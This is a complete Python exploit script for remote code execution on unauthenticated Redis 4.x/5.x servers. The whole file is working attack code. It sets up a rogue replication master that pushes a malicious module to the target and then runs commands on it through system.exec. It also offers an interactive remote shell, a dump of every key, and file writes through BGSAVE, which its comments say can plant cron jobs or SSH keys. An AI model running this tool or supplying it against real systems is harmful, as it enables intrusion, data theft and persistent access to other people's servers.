#!/usr/bin/env python3
"""
Redis Rogue Master Exploit Client
--------------------------------
This client automates the Redis master‑slave replication RCE technique
exploiting Redis 4.x / 5.x (versions <= 5.0.5) that allow loading a
malicious module via the replication protocol.

The script provides three modes:
  * check      – Verify the target Redis instance is reachable.
  * exploit    – Perform the full exploitation chain:
                  1. Set `dir` and `dbfilename` on the target.
                  2. Start a rogue master server that streams a
                     pre‑compiled malicious module (`exp.so`).
                  3. Issue `SLAVEOF <LHOST> <LPORT>` to force the
                     target to pull the module.
                  4. Load the module with `MODULE LOAD ./exp.so`.
                  5. Execute an arbitrary command using the
                     `system.exec` command provided by the module.
  * shell      – An interactive shell that runs commands via
                 `system.exec` after the module is loaded.

The script uses only the Python standard library (socket, threading,
argparse and json) to stay lightweight and works inside the lab
environment without additional dependencies.

Usage example:
    python3 client.py 127.0.0.1 --mode exploit --command "id"
"""

import argparse
import socket
import threading
import sys
import os
import time
import random
import string

# ------------------------------------------------------------
# Helper functions – RESP encoding/decoding
# ------------------------------------------------------------
def _resp_encode(parts):
    """Encode a list of command parts to the Redis RESP format.

    Each part is a string. The function returns a bytes object ready to be
    sent over a TCP socket.
    """
    resp = f"*{len(parts)}\r\n".encode()
    for part in parts:
        part_bytes = part.encode()
        resp += f"${len(part_bytes)}\r\n".encode() + part_bytes + b"\r\n"
    return resp

def _recv_line(sock):
    """Read a line terminated by CRLF from the socket."""
    line = b""
    while not line.endswith(b"\r\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        line += chunk
    return line

def _recv_bulk(sock, length):
    """Receive an exact number of bytes for a bulk string."""
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return data

# ------------------------------------------------------------
# Redis client wrapper (minimal – only what we need)
# ------------------------------------------------------------
class RedisClient:
    def __init__(self, host, port=6379, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = socket.create_connection((host, port), timeout=timeout)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

    def send(self, *parts):
        self.sock.sendall(_resp_encode(list(parts)))
        # Simple: read a single line reply (we only need simple +OK/-ERR)
        line = _recv_line(self.sock)
        return line.decode(errors="ignore").strip()

    def ping(self):
        return self.send("PING")

    def config_set(self, key, value):
        return self.send("CONFIG", "SET", key, value)

    def module_load(self, path):
        return self.send("MODULE", "LOAD", path)

    def system_exec(self, cmd):
        return self.send("system.exec", cmd)

    def slaveof(self, host, port):
        return self.send("SLAVEOF", host, str(port))

# ------------------------------------------------------------
# Rogue master server – streams the malicious .so file
# ------------------------------------------------------------
class RogueServer(threading.Thread):
    def __init__(self, bind_ip, bind_port, module_path):
        super().__init__(daemon=True)
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.module_path = module_path
        self._stop_event = threading.Event()
        self.client_sock = None
        self._repl_id = "".join(random.choice(string.hexdigits.lower()) for _ in range(40))

    def stop(self):
        self._stop_event.set()
        try:
            if self.client_sock:
                self.client_sock.close()
        except Exception:
            pass

    def run(self):
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((self.bind_ip, self.bind_port))
        server_sock.listen(1)
        # Wait for the target to connect
        server_sock.settimeout(30)
        try:
            self.client_sock, _ = server_sock.accept()
        except socket.timeout:
            print("[!] Rogue server timed out waiting for target connection.")
            server_sock.close()
            return
        server_sock.close()

        # Helper to send raw bytes
        def send_raw(data: bytes):
            self.client_sock.sendall(data)

        # 1) PING -> +PONG
        line = _recv_line(self.client_sock)
        # (ignore content – the client sends a RESP array)
        send_raw(b"+PONG\r\n")

        # 2) REPLCONF (multiple lines) – respond +OK for each
        while True:
            line = _recv_line(self.client_sock)
            if not line:
                break
            if line.startswith(b"*"):
                # Start of a command – read the rest of the bulk strings
                parts = []
                count = int(line[1:-2])
                for _ in range(count):
                    bulk_len_line = _recv_line(self.client_sock)
                    bulk_len = int(bulk_len_line[1:-2])
                    bulk_data = _recv_bulk(self.client_sock, bulk_len)
                    _recv_line(self.client_sock)  # trailing CRLF
                    parts.append(bulk_data)
                cmd = parts[0].decode(errors="ignore").upper()
                if cmd == "REPLCONF":
                    send_raw(b"+OK\r\n")
                    continue
                if cmd in ("PSYNC", "SYNC"):
                    # 3) Full resync – send +FULLRESYNC and the RDB payload
                    # Read the rest of the request (ignore its content)
                    # Build the payload
                    try:
                        with open(self.module_path, "rb") as f:
                            payload = f.read()
                    except Exception as e:
                        print(f"[!] Failed to read module file: {e}")
                        send_raw(b"-ERR module not found\r\n")
                        break
                    # RESP bulk string for the RDB / module file
                    header = f"+FULLRESYNC {self._repl_id} 1\r\n".encode()
                    bulk = f"${len(payload)}\r\n".encode() + payload + b"\r\n"
                    send_raw(header + bulk)
                    # After sending the payload the master would normally keep the
                    # connection open for further replication. For our purpose we
                    # close it right away.
                    break
            else:
                # Unexpected line – ignore
                continue
        self.client_sock.close()

# ------------------------------------------------------------
# Exploit workflow
# ------------------------------------------------------------
def _detect_local_ip(target_ip, target_port):
    """Detect the local IP address that would be used to reach the target.
    This works even when the host has multiple interfaces.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # The address doesn't need to be reachable – we only want a route.
        s.connect((target_ip, target_port))
        local_ip = s.getsockname()[0]
    finally:
        s.close()
    return local_ip

def check_target(host, port):
    try:
        rc = RedisClient(host, port)
        resp = rc.ping()
        rc.close()
        if resp.startswith("+PONG"):
            print(f"[+] Redis at {host}:{port} responded to PING.")
            return True
        print(f"[!] Unexpected PING reply: {resp}")
    except Exception as e:
        print(f"[-] Could not connect to Redis at {host}:{port}: {e}")
    return False

def _read_resp(sock):
    """Full RESP response parser (handles +, -, :, $, * types)."""
    line = _recv_line(sock)
    if not line:
        return None
    t, rest = chr(line[0]), line[1:].decode(errors="replace")
    if t == "+":
        return rest
    if t == "-":
        raise RuntimeError(rest)
    if t == ":":
        return int(rest)
    if t == "$":
        n = int(rest)
        if n == -1:
            return None
        data = _recv_bulk(sock, n)
        sock.recv(2)  # trailing CRLF
        return data.decode(errors="replace")
    if t == "*":
        n = int(rest)
        return None if n == -1 else [_read_resp(sock) for _ in range(n)]
    return line.decode(errors="replace")


def _redis_cmd(host, port, *args):
    """One-shot command: connect, send, read one response, close."""
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(_resp_encode(list(args)))
    result = _read_resp(s)
    s.close()
    return result


def dump_keys(host, port):
    """Enumerate all keys and print their values."""
    s = socket.create_connection((host, port), timeout=10)
    s.sendall(_resp_encode(["KEYS", "*"]))
    keys = _read_resp(s)
    s.close()
    if not keys:
        print("[*] No keys found.")
        return
    print(f"[+] Found {len(keys)} key(s):\n")
    for k in keys:
        try:
            t = _redis_cmd(host, port, "TYPE", k)
            if t == "string":
                v = _redis_cmd(host, port, "GET", k)
            elif t == "list":
                v = _redis_cmd(host, port, "LRANGE", k, 0, -1)
            elif t == "set":
                v = _redis_cmd(host, port, "SMEMBERS", k)
            elif t == "hash":
                v = _redis_cmd(host, port, "HGETALL", k)
            else:
                v = f"<{t}>"
            print(f"  [{t}] {k!r}: {v!r}")
        except Exception as e:
            print(f"  {k!r}: <error: {e}>")


def write_file(host, port, directory, filename, content):
    """
    File-write RCE via CONFIG SET + BGSAVE.
    The RDB dump wraps the payload in binary headers; cron and SSH
    authorized_keys parsers ignore the surrounding bytes.
    """
    rc = socket.create_connection((host, port), timeout=10)

    def cmd(*args):
        rc.sendall(_resp_encode(list(args)))
        return _read_resp(rc)

    orig_dir = cmd("CONFIG", "GET", "dir")[1]
    orig_dbf = cmd("CONFIG", "GET", "dbfilename")[1]

    print(f"[*] Redirecting persistence -> {directory}/{filename}")
    cmd("CONFIG", "SET", "dir", directory)
    cmd("CONFIG", "SET", "dbfilename", filename)
    cmd("SET", "_rce_payload", content)
    cmd("BGSAVE")
    time.sleep(1)
    print(f"[+] BGSAVE issued - file at {directory}/{filename}")
    print(f"[*] Embedded payload: {content!r}")

    cmd("CONFIG", "SET", "dir", orig_dir)
    cmd("CONFIG", "SET", "dbfilename", orig_dbf)
    cmd("DEL", "_rce_payload")
    rc.close()
    print(f"[*] Config restored -> {orig_dir}/{orig_dbf}")


def perform_exploit(args):
    target = args.target
    port = args.port
    lhost = args.lhost or _detect_local_ip(target, port)
    lport = args.lport
    module_path = args.module
    command = args.command

    if not os.path.isfile(module_path):
        print(f"[-] Module file not found: {module_path}")
        sys.exit(1)

    print(f"[*] Using local IP {lhost} for SLAVEOF.")

    # 1. Connect to target and set dir/dbfilename – these are where the module
    #    will be written during replication.
    client = RedisClient(target, port)
    print("[*] Configuring target Redis to write the module to /tmp/exp.so")
    client.config_set("dir", "/tmp")
    client.config_set("dbfilename", "exp.so")
    # 2. Start rogue server in a background thread.
    server = RogueServer(lhost, lport, module_path)
    server.start()
    time.sleep(1)  # give the server a moment to listen
    # 3. Instruct the target to become a replica of our rogue server.
    print(f"[*] Issuing SLAVEOF {lhost} {lport} to target")
    client.slaveof(lhost, lport)
    # 4. Wait for the rogue server to finish transferring the file.
    server.join(timeout=30)
    # 5. After replication the slave is still in replica mode – turn it back to
    #    master so we can continue issuing commands.
    print("[*] Restoring target to master mode (SLAVEOF NO ONE)")
    client.slaveof("NO", "ONE")
    # 6. Load the malicious module.
    print("[*] Loading the malicious module on target")
    load_resp = client.module_load("./exp.so")
    print(f"[+] MODULE LOAD response: {load_resp}")
    # 7. Execute the desired command via system.exec.
    print(f"[*] Executing command on target: {command}")
    exec_resp = client.system_exec(command)
    print(f"[+] system.exec response: {exec_resp}")
    client.close()

def interactive_shell(args):
    target = args.target
    port = args.port
    client = RedisClient(target, port)
    print("[*] Interactive shell – type commands, use 'exit' to quit.")
    while True:
        try:
            cmd = input("shell> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Exiting shell.")
            break
        if cmd.lower() == "exit":
            break
        if not cmd:
            continue
        resp = client.system_exec(cmd)
        print(resp)
    client.close()

def main():
    parser = argparse.ArgumentParser(description="Redis rogue‑master RCE client")
    parser.add_argument("target", help="Target Redis host (IP or hostname)")
    parser.add_argument("--port", type=int, default=6379, help="Target Redis port (default: 6379)")
    parser.add_argument(
        "--mode",
        choices=["check", "keys", "write", "exploit", "shell"],
        default="check",
        help=(
            "check   - verify unauth access | "
            "keys    - enumerate all keys | "
            "write   - file-write RCE via BGSAVE | "
            "exploit - rogue-master module-load RCE | "
            "shell   - system.exec shell (post-exploit)"
        ),
    )
    parser.add_argument("--dir",      default="/tmp",
                        help="Target directory for write mode (default: /tmp)")
    parser.add_argument("--filename", default="redis_test.txt",
                        help="Target filename for write mode")
    parser.add_argument("--content",  default="\n\n# redis rce test\n\n",
                        help="Payload content for write mode")
    parser.add_argument("--module", default="exp.so",
                        help="Path to the compiled malicious module (default: exp.so in cwd)")
    parser.add_argument("--command", default="id",
                        help="Command to execute after the module is loaded (default: id)")
    parser.add_argument("--lhost", help="Local IP for the rogue server (auto‑detected if omitted)")
    parser.add_argument("--lport", type=int, default=21000,
                        help="Port on which the rogue server listens (default: 21000)")
    args = parser.parse_args()

    if args.mode == "check":
        check_target(args.target, args.port)
    elif args.mode == "keys":
        dump_keys(args.target, args.port)
    elif args.mode == "write":
        print(f"\n[*] File-write RCE: {args.dir}/{args.filename}")
        print("[*] RDB headers wrap the payload; cron/authorized_keys tolerate them.")
        write_file(args.target, args.port, args.dir, args.filename, args.content)
    elif args.mode == "exploit":
        perform_exploit(args)
    elif args.mode == "shell":
        interactive_shell(args)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
